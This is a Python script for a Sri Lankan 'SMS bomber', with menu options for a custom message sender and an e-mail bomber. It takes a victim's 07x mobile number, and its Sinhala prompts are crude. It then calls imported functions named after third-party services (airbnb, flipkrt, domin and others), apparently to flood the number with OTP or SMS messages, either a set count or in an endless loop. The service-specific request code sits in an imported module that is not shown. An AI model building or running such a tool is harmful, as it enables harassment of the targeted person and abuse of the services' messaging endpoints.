
import os,random,sys,time
from urllib import request
from api import *
import codecs
cle = 'clear' if os.name == 'posix' else 'cls'
from colorama import Fore,init,Style
init(autoreset=True)
os.system(cle)
fore=['\x1b[91m','\x1b[34m','\x1b[36m','\x1b[93m','\x1b[32m','\x1b[35m','\x1b[31m','\x1b[94m','\x1b[96m','\x1b[92m','\x1b[33m','\x1b[95m']
logo=("""
░██████╗███╗░░░███╗░██████╗  
██╔════╝████╗░████║██╔════╝  
╚█████╗░██╔████╔██║╚█████╗░  
░╚═══██╗██║╚██╔╝██║░╚═══██╗  
██████╔╝██║░╚═╝░██║██████╔╝  
╚═════╝░╚═╝░░░░░╚═╝╚═════╝░  
██████╗░░█████╗░███╗░░░███╗██████╗░███████╗██████╗░
██╔══██╗██╔══██╗████╗░████║██╔══██╗██╔════╝██╔══██╗
██████╦╝██║░░██║██╔████╔██║██████╦╝█████╗░░██████╔╝
██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗██╔══╝░░██╔══██╗
██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝███████╗██║░░██║
╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░╚══════╝╚═╝░░╚═╝

By Inuka ASiTH
""")
bar=f'{random.choice(fore)}\x1b[1m_________________________{random.choice(fore)}_________________________\x1b[0m'
print(bar+'\n')
print(logo)
print(bar+'\n')
time.sleep(0.3)
print ("""
1) Start SMS Bomber
2) Start Custom Message Sender
3) Start E-Mail Bomber
4) About
5) Exit""")
def prsent(count,num):
	sys.stdout.write('\r' +random.choice(fore) +Style.BRIGHT+'\t[*]'+' Bombing '+str(num)+'\t'+str(count)+' Sent')
	sys.stdout.flush()
def Spinner():
	l=['|','/','-','\\']
	for i in l+l+l:
		sys.stdout.write('\r'+Style.BRIGHT+Fore.LIGHTYELLOW_EX+'[*]Checking Internet Connection '+i)
		sys.stdout.flush()
		time.sleep(0.2)
time.sleep(0.3)
while True:
	try:
		cho=int(input(Fore.LIGHTCYAN_EX+Style.BRIGHT+'Enter Your Choice: '))
		if cho > 0 and cho <6:
			break
		else:
			Print(Fore.LIGHTRED_EX+Style.BRIGHT+'[!] Please Enter A Correct Choice!')
	except:
			print(Fore.LIGHTRED_EX+Style.BRIGHT+'[!] ගහපු Choice එක වැරදියි. හරියට අන්කෙ ගහන්න')
if cho==1:
	time.sleep(0.4)
	os.system(cle)
	print(bar+'\n')
	print(logo)
	print(bar+'\n')
	try:
		Spinner()
		request.urlopen('https://httpbin.org/get')
		print(Fore.LIGHTGREEN_EX+Style.BRIGHT+'\n[+] හරියට Connect උනා!')
		time.sleep(1.5)
		os.system(cle)
		print(bar+'\n')
		print(logo)
		print(bar+'\n')
	except:
		time.sleep(0.4)
		print(Fore.LIGHTRED_EX+Style.BRIGHT+'\n[!] You Aren\'t Connected To Internet!')
		time.sleep(0.3)
		print(Fore.LIGHTRED_EX+Style.BRIGHT+'[!] Data on කරන් වරෙන්. Internet හරියට Connect වෙලා නෑ...')
		time.sleep(0.3)
		input(Fore.LIGHTRED_EX+Style.BRIGHT+'[!] දොට්ට බහිමින්...\nEnter ඔබන්න ආපහු යන්න ඕන නම්...')
		exit()
	while True:
		try:
			num=int(input(Style.BRIGHT+'කෙලවන්න ඕන අංකෙ ගහන්න(07xxxxxxxx): '))
			num='0'+str(num)
			if len(num) == 10 and str(num)[0:3] in ('070','071','072','075','076','077','078'):
				break
			else:
				print(Fore.LIGHTRED_EX + 'ගහපු අංකෙ වැරදියි.. හරියට අංකෙ ගහන්න!')
				continue
		except ValueError:
			print(Fore.LIGHTRED_EX + 'ටෙලිෆෝන් අංකයක් මැද අකුරු එන්න බෑ යකෝ..හරියට අංකෙ ගහපන්!!')
			continue
	time.sleep(0.4)
	while True:
		times=input(Style.BRIGHT+Fore.LIGHTYELLOW_EX+'Messages කීයක් යවනවද Unlimited යවනව නම් (U) ගහන්න:')
		if times.isnumeric() or times == 'U' or	times == 'u':
			break
		else:
			print(Style.BRIGHT+Fore.LIGHTRED_EX+'[!] හරි Amount එකක් ගහන්න නැත්තම් \'U\' ගහන්න Unlimited')
	time.sleep(0.4)
	while True:
		delay=input(Style.BRIGHT+Fore.LIGHTMAGENTA_EX+'Delay Time එකක් දෙන්න (Seconds වලින්)\n\t\t[Recomended 5]:')
		if delay.isnumeric() and int(delay) > 0:
			delay=float(delay)
			break
		elif delay=='0':
			print(Style.BRIGHT+Fore.LIGHTRED_EX+'[!] 0 ට වැඩිය Value එකක් දෙන්න')
		else:
			delay=5.0
			break
	os.system(cle)
	print(bar+'\n')
	print(logo)
	print(bar+'\n')
	time.sleep(0.5)
	print(f'\t{Style.BRIGHT}මේක ආතල් ගන්න විතරක් Use කරපන් මේකෙන් පළිගන්න එපෝ!!\n\t     https://t.me/InfinityJE \n\t Based on SL Bomber[https://github.com/Sl-Sanda-Ru/Sl-Bomber.git]' )
	print(bar+'\n')
	print(Fore.YELLOW+Style.BRIGHT+'\tදැන් නවත්තන්න ඕන නම් Ctrl+c ඔබන්න')
	if num[0:3] == '077' or num[0:3] == '076':
		count=0
		if times.isnumeric():
			while count< int(times):
				mega(num,delay)
				count+=1
				prsent(count,num)
				if count<int(times):
					yogo(num,delay)
					count+=1
					prsent(count,num)
					if count<int(times):
						guru(num,delay)
						count+=1
						prsent(count,num)
						if count<int(times):
							pat(num,delay)
							count+=1
							prsent(count,num)
							if count<int(times):
								doc(num,delay)
								count+=1
								prsent(count,num)
								if count<int(times):
									idea(num,delay)
									count+=1
									prsent(count,num)
									if count<int(times):
										ona(num,delay)
										count+=1
										prsent(count,num)
										if count<int(times):
											sing(num,delay)
											count+=1
											prsent(count,num)
											if count<int(times):
												kangaroo(num,delay)
												count+=1
												prsent(count,num)
												if count<int(times):
													airbnb(num,delay)
													count+=1
													prsent(count,num)
													if count<int(times):
														flipkrt(num,delay)
														count+=1
														prsent(count,num)
														if count<int(times):
															savari(num,delay)
															count+=1
															prsent(count,num)
															if count<int(times):
																youcab(num,delay)
																count+=1
																prsent(count,num)
																if count<int(times):
																	upay(num,delay)
																	count+=1
																	prsent(count,num)
																	if count<int(times):
																		nanasa(num,delay)
																		count+=1
																		prsent(count,num)
																		if count<int(times):
																			domin(num,delay)
																			count+=1
																			prsent(count,num)
																			if count< int(times):
																				slmat(num,delay)
																				count+=1
																				prsent(count,num)
																				if count<int(times):
																					echan(num,delay)
																					count+=1
																					prsent(count,num)
																					if count<int(times):
																						oli(num,delay)
																						count+=1
																						prsent(count,num)
		else:
			while True:
				mega(num,delay)
				count+=1
				prsent(count,num)
				yogo(num,delay)
				count+=1
				prsent(count,num)
				guru(num,delay)
				count+=1
				prsent(count,num)
				slmat(num,count)
				count+=1
				prsent(count,num)
				kangaroo(num,delay)
				count+=1
				prsent(count,num)
				pat(num,delay)
				count+=1
				prsent(count,num)
				sing(num,delay)
				count+=1
				prsent(count,num)
				doc(num,delay)
				count+=1
				prsent(count,num)
				idea(num,delay)
				count+=1
				prsent(count,num)
				ona(num,delay)
				count+=1
				prsent(count,num)
				airbnb(num,delay)
				count+=1
				prsent(count,num)
				flipkrt(num,delay)
				count+=1
				prsent(count,num)
				savari(num,delay)
				count+=1
				prsent(count,num)
				youcab(num,delay)
				count+=1
				prsent(count,num)
				upay(num,delay)
				count+=1
				prsent(count,num)
				nanasa(num,delay)
				count+=1
				prsent(count,num)
				domin(num,delay)
				count+=1
				prsent(count,num)
				echan(num,delay)
				count+=1
				prsent(count,num)
				oli(num,delay)
				count+=2
				prsent(count,num)
	elif num[0:3] == '071' or num[0:3] == '070':
		count=0
		if times.isnumeric():
			while count< int(times):
				dtamart(num,delay)
				count+=1
				prsent(count,num)
				if count<int(times):
					dtamart2(num,delay)
					count+=1
					prsent(count,num)
					if count<int(times):
						yogo(num,delay)
						count+=1
						prsent(count,num)
						if count<int(times):
							guru(num,delay)
							count+=1
							prsent(count,num)
							if count<int(times):
								kangaroo(num,delay)
								count+=1
								prsent(count,num)
								if count<int(times):
									airbnb(num,delay)
									count+=1
									prsent(count,num)
									if count<int(times):
										pat(num,delay)
										count+=1
										prsent(count,num)
										if count<int(times):
											doc(num,delay)
											count+=1
											prsent(count,num)
											if count<int(times):
												idea(num,delay)
												count+=1
												prsent(count,num)
												if count<int(times):
													ona(num,delay)
													count+=1
													prsent(count,num)
													if count<int(times):
														flipkrt(num,delay)
														count+=1
														prsent(count,num)
														if count<int(times):
															savari(num,delay)
															count+=1
															prsent(count,num)
															if count<int(times):
																sing(num,delay)
																count+=1
																prsent(count,num)
																if count<int(times):
																	youcab(num,delay)
																	count+=1
																	prsent(count,num)
																	if count<int(times):
																		upay(num,delay)
																		count+=1
																		prsent(count,num)
																		if count<int(times):
																			nanasa(num,delay)
																			count+=1
																			prsent(count,num)
																			if count<int(times):
																				domin(num,delay)
																				count+=1
																				prsent(count,num)
																				if count< int(times):
																					slmat(num,delay)
																					count+=1
																					prsent(count,num)
																					if count< int(times):
																						mobself(num,delay)
																						count+=1
																						prsent(count,num)
																						if count<int(times):
																							echan(num,delay)
																							count+=1
																							prsent(count,num)
																							if count<int(times):
																								oli(num,delay)
																								count+=1
																								prsent(count,num)
		else:
			while True:
				dtamart(num,delay)
				count+=1
				prsent(count,num)
				dtamart2(num,delay)
				count+=1
				prsent(count,num)
				yogo(num,delay)
				count+=1
				prsent(count,num)
				guru(num,delay)
				count+=1
				prsent(count,num)
				pat(num,delay)
				count+=1
				prsent(count,num)
				sing(num,delay)
				count+=1
				prsent(count,num)
				doc(num,delay)
				count+=1
				prsent(count,num)
				idea(num,delay)
				count+=1
				prsent(count,num)
				ona(num,delay)
				count+=1
				prsent(count,num)
				kangaroo(num,delay)
				count+=1
				prsent(count,num)
				mobself(num,delay)
				count+=1
				prsent(count,num)
				airbnb(num,delay)
				count+=1
				prsent(count,num)
				flipkrt(num,delay)
				count+=1
				prsent(count,num)
				slmat(num,count)
				count+=1
				prsent(count,num)
				savari(num,delay)
				count+=1
				prsent(count,num)
				youcab(num,delay)
				count+=1
				prsent(count,num)
				upay(num,delay)
				count+=1
				prsent(count,num)
				nanasa(num,delay)
				count+=1
				prsent(count,num)
				domin(num,delay)
				count+=1
				prsent(count,num)
				echan(num,delay)
				count+=1
				prsent(count,num)
				oli(num,delay)
				count+=2
				prsent(count,num)
	elif num[0:3] == '078' or num[0:3] == '072':
		count=0
		if times.isnumeric():
			while count< int(times):
				hutcliq(num,delay)
				count+=1
				prsent(count,num)
				if count<int(times):
					hutself(num,delay)
					count+=1
					prsent(count,num)
					if count<int(times):
						yogo(num,delay)
						count+=1
						prsent(count,num)
						if count<int(times):
							guru(num,delay)
							count+=1
							prsent(count,num)
							if count<int(times):
								kangaroo(num,delay)
								count+=1
								prsent(count,num)
								if count<int(times):
									pat(num,delay)
									count+=1
									prsent(count,num)
									if count<int(times):
										doc(num,delay)
										count+=1
										prsent(count,num)
										if count<int(times):
										  sing(num,delay)
										  count+=1
										  prsent(count,num)
										  if count<int(times):
										  	idea(num,delay)
										  	count+=1
										  	prsent(count,num)
  											if count<int(times):
  												ona(num,delay)
  												count+=1
  												prsent(count,num)
  												if count<int(times):
  													airbnb(num,delay)
  													count+=1
  													prsent(count,num)
  													if count<int(times):
  														flipkrt(num,delay)
  														count+=1
  														prsent(count,num)
  														if count<int(times):
  															savari(num,delay)
  															count+=1
  															prsent(count,num)
  															if count<int(times):
  																youcab(num,delay)
  																count+=1
  																prsent(count,num)
  																if count<int(times):
  																	upay(num,delay)
  																	count+=1
  																	prsent(count,num)
  																	if count<int(times):
  																		nanasa(num,delay)
  																		count+=1
  																		prsent(count,num)
  																		if count<int(times):
  																			domin(num,delay)
  																			count+=1
  																			prsent(count,num)
  																			if count< int(times):
  																				slmat(num,delay)
  																				count+=1
  																				prsent(count,num)
  																				if count<int(times):
  																					echan(num,delay)
  																					count+=1
  																					prsent(count,num)
  																					if count<int(times):
  																						oli(num,delay)
  																						count+=1
  																						prsent(count,num)
		else:
			while True:
				hutcliq(num,delay)
				count+=1
				prsent(count,num)
				hutself(num,delay)
				count+=1
				prsent(count,num)
				yogo(num,delay)
				count+=1
				prsent(count,num)
				guru(num,delay)
				count+=1
				prsent(count,num)
				slmat(num,count)
				count+=1
				prsent(count,num)
				kangaroo(num,delay)
				count+=1
				prsent(count,num)
				pat(num,delay)
				count+=1
				prsent(count,num)
				sing(num,delay)
				count+=1
				prsent(count,num)
				doc(num,delay)
				count+=1
				prsent(count,num)
				idea(num,delay)
				count+=1
				prsent(count,num)
				ona(num,delay)
				count+=1
				prsent(count,num)
				airbnb(num,delay)
				count+=1
				prsent(count,num)
				flipkrt(num,delay)
				count+=1
				prsent(count,num)
				savari(num,delay)
				count+=1
				prsent(count,num)
				youcab(num,delay)
				count+=1
				prsent(count,num)
				upay(num,delay)
				count+=1
				prsent(count,num)
				nanasa(num,delay)
				count+=1
				prsent(count,num)
				domin(num,delay)
				count+=1
				prsent(count,num)
				echan(num,delay)
				count+=1
				prsent(count,num)
				oli(num,delay)
				count+=2
				prsent(count,num)
	elif num[0:3] == '075':
		count=0
		if times.isnumeric():
			while count< int(times):
				yogo(num,delay)
				count+=1
				prsent(count,num)
				if count<int(times):
					guru(num,delay)
					count+=1
					prsent(count,num)
					if count<int(times):
						kangaroo(num,delay)
						count+=1
						prsent(count,num)
						if count<int(times):
							pat(num,delay)
							count+=1
							prsent(count,num)
							if count<int(times):
								doc(num,delay)
								count+=1
								prsent(count,num)
								if count<int(times):
									idea(num,delay)
									count+=1
									prsent(count,num)
									if count<int(times):
									  sing(num,delay)
									  count+=1
									  prsent(count,num)
									  if count<int(times):
  										ona(num,delay)
  										count+=1
  										prsent(count,num)
  										if count<int(times):
  											airbnb(num,delay)
  											count+=1
  											prsent(count,num)
  											if count<int(times):
  												flipkrt(num,delay)
  												count+=1
  												prsent(count,num)
  												if count<int(times):
  													savari(num,delay)
  													count+=1
  													prsent(count,num)
  													if count<int(times):
  														youcab(num,delay)
  														count+=1
  														prsent(count,num)
  														if count<int(times):
  															upay(num,delay)
  															count+=1
  															prsent(count,num)
  															if count<int(times):
  																nanasa(num,delay)
  																count+=1
  																prsent(count,num)
  																if count<int(times):
  																	domin(num,delay)
  																	count+=1
  																	prsent(count,num)
  																	if count< int(times):
  																		slmat(num,delay)
  																		count+=1
  																		prsent(count,num)
  																		if count<int(times):
  																			echan(num,delay)
  																			count+=1
  																			prsent(count,num)
  																			if count<int(times):
  																				oli(num,delay)
  																				count+=1
  																				prsent(count,num)
		else:
			while True:
				yogo(num,delay)
				count+=1
				prsent(count,num)
				guru(num,delay)
				count+=1
				prsent(count,num)
				kangaroo(num,delay)
				count+=1
				prsent(count,num)
				airbnb(num,delay)
				count+=1
				prsent(count,num)
				pat(num,delay)
				count+=1
				prsent(count,num)
				sing(num,delay)
				count+=1
				prsent(count,num)
				doc(num,delay)
				count+=1
				prsent(count,num)
				idea(num,delay)
				count+=1
				prsent(count,num)
				ona(num,delay)
				count+=1
				prsent(count,num)
				flipkrt(num,delay)
				count+=1
				prsent(count,num)
				savari(num,delay)
				count+=1
				prsent(count,num)
				youcab(num,delay)
				count+=1
				prsent(count,num)
				upay(num,delay)
				count+=1
				prsent(count,num)
				slmat(num,count)
				count+=1
				prsent(count,num)
				nanasa(num,delay)
				count+=1
				prsent(count,num)
				domin(num,delay)
				count+=1
				prsent(count,num)
				echan(num,delay)
				count+=1
				prsent(count,num)
				oli(num,delay)
				count+=2
				prsent(count,num)
	print('\n'+bar+'\n')
	time.sleep(0.90)
	print(f'{Style.BRIGHT}{Fore.LIGHTGREEN_EX}\t[+] සාර්ථකව කෙලවීම අවසන් කරන ලදි!!')
	time.sleep(0.75)
	ag=input(f'\t{Style.BRIGHT}{random.choice(fore)}[?] තා කාටහරි කෙලවන්න තියෙද?(y/n) ')
	if ag == 'Y' or ag == 'y':
		os.system('python infinitybomber.py')
	else:
		exit()
elif cho == 2:
	os.system('python sms2.py')

elif cho == 3:
        os.system('python ebomber.py')
elif cho == 4:
	os.system(cle)
	print(bar+'\n')
	print(logo)
	print(bar+'\n')
	print("""
This Aplication developed by InukaASiTH
[*] Text Message bomber is a copy of SL Bomber By SL Sandaru (https://github.com/Sl-Sanda-Ru/Sl-Bomber.git)
A Product By JASON ENT®(t.me/InfinityJE)
""")
	agd=input(f'\t{Style.BRIGHT}{random.choice(fore)}[?] Do you want to go back to main menu (y/n): ')
	if agd == 'Y' or agd == 'y':
		os.system('python infinitybomber.py')
	
else:
	exit()
